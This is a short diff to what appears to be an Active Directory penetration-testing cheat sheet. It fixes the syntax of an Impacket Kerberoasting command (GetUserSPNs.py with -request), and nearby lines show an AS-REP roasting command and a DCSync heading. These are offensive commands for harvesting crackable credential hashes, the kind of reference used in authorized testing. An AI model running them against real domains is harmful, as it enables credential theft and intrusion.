@@ -730,7 +730,7 @@ GetNPUsers.py domain.local/user -usersfile users.txt
 Kerberoasting
 
 ```
-GetUserSPNs.py DC-IP\user:password
+GetUserSPNs.py domain.local/user:password -dc-ip IP -request
 ```
 DRSUAPI (DCSync/NTDS Dumping)
 
